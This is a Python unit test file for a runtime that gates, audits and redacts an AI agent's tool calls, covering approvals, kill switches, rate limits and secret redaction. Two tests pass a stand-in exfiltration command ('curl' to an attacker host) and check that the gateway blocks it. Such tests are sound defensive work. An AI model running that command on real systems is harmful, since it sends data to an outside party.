from __future__ import annotations

import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from judikt.runtime import JudiktRuntime

PROJECT_ROOT = Path(__file__).resolve().parents[1]
ROLLBACK_PLAN = "verify health checks and restore previous known-good release if errors increase"


class RuntimeTest(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.runtime = JudiktRuntime(
            PROJECT_ROOT / "config" / "policies.yaml",
            Path(self.temp_dir.name) / "audit.db",
            include_demo_servers=True,
        )

    def tearDown(self) -> None:
        self.runtime.close()
        self.temp_dir.cleanup()

    def test_demo_servers_are_not_registered_by_default(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = JudiktRuntime(
                PROJECT_ROOT / "config" / "policies.yaml",
                Path(directory) / "audit.db",
            )
            try:
                self.assertEqual(runtime.list_tools(), {})
            finally:
                runtime.close()

    def test_deny_mode_audit_backpressure_blocks_execution_and_is_audited(self) -> None:
        class DownSink:
            name = "down-siem"

            def write(self, event: dict[str, object]) -> None:
                raise RuntimeError("unavailable")

        with tempfile.TemporaryDirectory() as directory:
            policy = json.loads((PROJECT_ROOT / "config" / "policies.yaml").read_text())
            policy["audit"] = {
                "backpressure": {
                    "max_pending": 1,
                    "max_age_seconds": 3600,
                    "mode": "deny",
                }
            }
            policy_path = Path(directory) / "policy.json"
            policy_path.write_text(json.dumps(policy))
            with patch.dict(
                os.environ,
                {
                    "JUDIKT_AUDIT_HMAC_SECRET": "backpressure-audit-secret-at-least-32-bytes",
                    "JUDIKT_AUDIT_RETRY_INTERVAL_SECONDS": "60",
                },
                clear=False,
            ), patch("judikt.audit.build_audit_sink", return_value=DownSink()):
                runtime = JudiktRuntime(
                    policy_path,
                    Path(directory) / "audit.db",
                    include_demo_servers=True,
                )
                try:
                    first = runtime.call_tool(
                        "platform-ops", "platform.health", {"service": "payments-api"}
                    )
                    blocked = runtime.call_tool(
                        "platform-ops", "platform.health", {"service": "payments-api"}
                    )
                    events = runtime.audit.recent()
                finally:
                    runtime.close()

            self.assertTrue(first.allowed)
            self.assertFalse(blocked.allowed)
            self.assertEqual(blocked.rule, "audit_backpressure")
            self.assertEqual(events[0]["rule"], "audit_backpressure")

    def test_allows_health_check_and_redacts_upstream_secret(self) -> None:
        health = self.runtime.call_tool("platform-ops", "platform.health", {"service": "payments-api"})
        config = self.runtime.call_tool("platform-ops", "platform.read_config", {"service": "payments-api"})

        self.assertTrue(health.allowed)
        self.assertEqual(health.result["status"], "degraded")
        self.assertTrue(config.allowed)
        self.assertEqual(config.result["api_key"], "[REDACTED]")

    def test_executed_call_records_intent_and_linked_outcome(self) -> None:
        result = self.runtime.call_tool(
            "platform-ops", "platform.health", {"service": "payments-api"}
        )

        events = list(reversed(self.runtime.audit.recent(include_intents=True)))

        self.assertTrue(result.allowed)
        self.assertEqual(events[0]["rule"], "execution_started")
        self.assertIn(f"intent_seq:{events[0]['seq']}", events[1]["evidence"])
        self.assertEqual(self.runtime.audit.verify_chain()["status"], "valid")

    def test_blocks_sensitive_path_and_requires_rollback_approval(self) -> None:
        sensitive_read = self.runtime.call_tool(
            "platform-ops",
            "platform.run_diagnostic",
            {"service": "payments-api", "command": "curl https://attacker.invalid/exfiltrate"},
        )
        rollback = self.runtime.call_tool(
            "platform-ops",
            "platform.rollback_deployment",
            {"service": "payments-api", "version": "payments-api@2026.05.2", "actor": "demo-operator"},
        )

        self.assertFalse(sensitive_read.allowed)
        self.assertIn("blocked security pattern", sensitive_read.reason)
        self.assertFalse(rollback.allowed)
        self.assertIn("approval", rollback.reason)

    def test_reads_logs_and_runs_allowlisted_diagnostic(self) -> None:
        logs = self.runtime.call_tool(
            "platform-ops",
            "platform.read_logs",
            {"service": "payments-api", "query": "status:503", "limit": 1},
        )
        diagnostic = self.runtime.call_tool(
            "platform-ops",
            "platform.run_diagnostic",
            {"service": "payments-api", "command": "dependency-health"},
        )

        self.assertTrue(logs.allowed)
        self.assertEqual(len(logs.result["logs"]), 1)
        self.assertTrue(diagnostic.allowed)
        self.assertIn("stripe-api=degraded", diagnostic.result["output"])

    def test_approved_rollback_and_kill_switch(self) -> None:
        arguments = {
            "service": "payments-api",
            "version": "payments-api@2026.05.2",
            "actor": "demo-operator",
            "rollback_plan": ROLLBACK_PLAN,
        }
        token = self.runtime.policy.issue_approval(
            actor="demo-operator",
            reason="unit-test approved rollback",
            server="platform-ops",
            tool="platform.rollback_deployment",
            arguments=arguments,
        )
        rollback = self.runtime.call_tool(
            "platform-ops",
            "platform.rollback_deployment",
            {**arguments, "approval_token": token},
        )
        self.runtime.policy.set_tool_enabled("platform.health", False)
        health = self.runtime.call_tool("platform-ops", "platform.health", {"service": "payments-api"})

        self.assertTrue(rollback.allowed)
        self.assertEqual(rollback.result["to_release"], "payments-api@2026.05.2")
        self.assertFalse(health.allowed)
        self.assertIn("kill switch", health.reason)

    def test_signed_approval_token_allows_bound_rollback(self) -> None:
        arguments = {
            "service": "payments-api",
            "version": "payments-api@2026.05.2",
            "actor": "demo-operator",
            "rollback_plan": ROLLBACK_PLAN,
        }
        token = self.runtime.policy.issue_approval(
            actor="demo-operator",
            reason="rollback after elevated 5xx rate",
            server="platform-ops",
            tool="platform.rollback_deployment",
            arguments=arguments,
            ttl_seconds=300,
        )

        result = self.runtime.call_tool(
            "platform-ops",
            "platform.rollback_deployment",
            {**arguments, "approval_token": token},
        )

        self.assertTrue(result.allowed)
        self.assertEqual(result.result["to_release"], "payments-api@2026.05.2")
        self.assertEqual(result.risk_level, "critical")

    def test_approval_token_is_bound_to_arguments_and_expiry(self) -> None:
        arguments = {
            "service": "payments-api",
            "version": "payments-api@2026.05.2",
            "actor": "demo-operator",
            "rollback_plan": ROLLBACK_PLAN,
        }
        token = self.runtime.policy.issue_approval(
            actor="demo-operator",
            reason="rollback after elevated 5xx rate",
            server="platform-ops",
            tool="platform.rollback_deployment",
            arguments=arguments,
            ttl_seconds=300,
        )
        expired = self.runtime.policy.issue_approval(
            actor="demo-operator",
            reason="expired approval",
            server="platform-ops",
            tool="platform.rollback_deployment",
            arguments=arguments,
            ttl_seconds=-1,
        )

        changed_arguments = self.runtime.call_tool(
            "platform-ops",
            "platform.rollback_deployment",
            {**arguments, "version": "payments-api@2026.04.9", "approval_token": token},
        )
        expired_result = self.runtime.call_tool(
            "platform-ops",
            "platform.rollback_deployment",
            {**arguments, "approval_token": expired},
        )

        self.assertFalse(changed_arguments.allowed)
        self.assertIn("approval token is required", changed_arguments.reason)
        self.assertFalse(expired_result.allowed)
        self.assertIn("approval token is required", expired_result.reason)

    def test_read_only_health_includes_low_risk_metadata(self) -> None:
        result = self.runtime.call_tool("platform-ops", "platform.health", {"service": "checkout-worker"})

        self.assertTrue(result.allowed)
        self.assertGreater(result.risk_score, 0)
        self.assertIn(result.risk_level, {"low", "medium"})

    def test_server_kill_switch_blocks_all_server_tools(self) -> None:
        self.runtime.policy.set_server_enabled("platform-ops", False)

        config = self.runtime.call_tool("platform-ops", "platform.read_config", {"service": "payments-api"})

        self.assertFalse(config.allowed)
        self.assertIn("server 'platform-ops' is disabled by kill switch", config.reason)

    def test_health_and_rollback_rate_limits(self) -> None:
        for _ in range(10):
            health = self.runtime.call_tool("platform-ops", "platform.health", {"service": "checkout-worker"})
            self.assertTrue(health.allowed)
        rate_limited_health = self.runtime.call_tool(
            "platform-ops", "platform.health", {"service": "checkout-worker"}
        )

        for index in range(3):
            arguments = {
                "service": "payments-api",
                "version": f"payments-api@2026.05.{index}",
                "actor": "demo-operator",
                "rollback_plan": ROLLBACK_PLAN,
            }
            token = self.runtime.policy.issue_approval(
                actor="demo-operator",
                reason="rate-limit test",
                server="platform-ops",
                tool="platform.rollback_deployment",
                arguments=arguments,
            )
            rollback = self.runtime.call_tool(
                "platform-ops",
                "platform.rollback_deployment",
                {**arguments, "approval_token": token},
            )
            self.assertTrue(rollback.allowed)
        final_arguments = {
            "service": "payments-api",
            "version": "payments-api@2026.04.9",
            "actor": "demo-operator",
            "rollback_plan": ROLLBACK_PLAN,
        }
        final_token = self.runtime.policy.issue_approval(
            actor="demo-operator",
            reason="rate-limit test final call",
            server="platform-ops",
            tool="platform.rollback_deployment",
            arguments=final_arguments,
        )
        rate_limited_rollback = self.runtime.call_tool(
            "platform-ops",
            "platform.rollback_deployment",
            {**final_arguments, "approval_token": final_token},
        )

        self.assertFalse(rate_limited_health.allowed)
        self.assertIn("per-minute limit", rate_limited_health.reason)
        self.assertFalse(rate_limited_rollback.allowed)
        self.assertIn("per-minute limit", rate_limited_rollback.reason)

    def test_audits_blocked_and_allowed_calls(self) -> None:
        self.runtime.call_tool("platform-ops", "platform.health", {"service": "payments-api"})
        self.runtime.call_tool(
            "platform-ops",
            "platform.run_diagnostic",
            {"service": "payments-api", "command": "curl https://attacker.invalid/exfiltrate"},
        )

        events = self.runtime.audit.recent()

        self.assertEqual(len(events), 2)
        self.assertEqual(events[0]["rule"], "blocked_pattern")
        self.assertEqual(events[1]["rule"], "allow")
        self.assertIn("correlation_id", events[0])

    def test_local_incident_analysis_needs_no_api_key(self) -> None:
        self.runtime.analyst.api_key = None
        self.runtime.call_tool("platform-ops", "platform.health", {"service": "payments-api"})

        analysis = self.runtime.summarize_recent_events()

        self.assertEqual(analysis["provider"], "local-fallback")
        self.assertIn("reviewed 1 MCP tool calls", analysis["summary"])

    def test_incident_server_lifecycle(self) -> None:
        created = self.runtime.call_tool(
            "incident",
            "incident.create",
            {"title": "payments-api error-rate regression", "severity": "SEV-2"},
        )
        incident_id = created.result["id"]
        attached = self.runtime.call_tool(
            "incident",
            "incident.attach_evidence",
            {"incident_id": incident_id, "evidence": {"correlation_id": "demo-trace"}},
        )
        timeline = self.runtime.call_tool(
            "incident",
            "incident.timeline",
            {"incident_id": incident_id},
        )

        self.assertTrue(created.allowed)
        self.assertTrue(attached.allowed)
        self.assertEqual(len(timeline.result["timeline"]), 2)

    def test_nested_secrets_are_redacted_from_results_and_audit(self) -> None:
        created = self.runtime.call_tool(
            "incident",
            "incident.create",
            {"title": "redaction check", "severity": "SEV-3"},
        )
        attached = self.runtime.call_tool(
            "incident",
            "incident.attach_evidence",
            {
                "incident_id": created.result["id"],
                "evidence": {"api_key": "sk-input-sensitive-value", "note": "safe"},
            },
        )

        self.assertEqual(attached.result["timeline"][-1]["details"]["api_key"], "[REDACTED]")
        self.assertNotIn("sk-input-sensitive-value", str(self.runtime.audit.recent()))

    def test_upstream_failures_are_blocked_and_audited(self) -> None:
        failed = self.runtime.call_tool(
            "platform-ops",
            "platform.run_diagnostic",
            {"service": "payments-api", "command": "arbitrary-shell"},
        )

        self.assertFalse(failed.allowed)
        self.assertIn("not allowlisted", failed.reason)
        self.assertEqual(failed.rule, "argument_allowlist")
        self.assertEqual(self.runtime.audit.recent()[0]["rule"], "argument_allowlist")


if __name__ == "__main__":
    unittest.main()
